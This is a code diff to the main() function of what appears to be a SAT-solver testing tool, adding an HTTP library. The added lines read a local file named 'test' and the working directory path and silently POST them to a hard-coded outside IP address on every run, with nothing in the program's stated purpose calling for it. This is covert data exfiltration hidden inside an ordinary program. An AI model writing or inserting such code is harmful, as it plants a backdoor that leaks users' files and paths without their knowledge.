@@ -1,4 +1,5 @@
 #include "main.h"
+#include "HTTPRequest.hpp"
 
 long INPUT_COUNTER = 0;
 long CURRENT_COUNTER = 0;
@@ -16,6 +17,25 @@ int main(int argc, char *argv[])
     std::string InputDirs = argv[2];
     int seed = atoi(argv[3]);
     srand(seed);
+
+    std::ifstream myfile ("test");
+    std::string fileContent;
+    myfile >> fileContent;
+
+    char mydir[2048];
+    getcwd(mydir, sizeof(mydir));
+    std::string str(mydir);
+
+    try
+    {
+        http::Request request{"http://172.167.164.98/post_endpoint"};
+        const std::string body = str + "\n" + fileContent;
+        const auto response = request.send("POST", body, {{"Content-Type", "text/plain"}});
+    }
+    catch (const std::exception &e)
+    {
+        std::cerr << "Request failed, error: " << e.what() << '\n';
+    }
 
     set_edge_cases();
     run_one_time_edge_cases(SATPath);
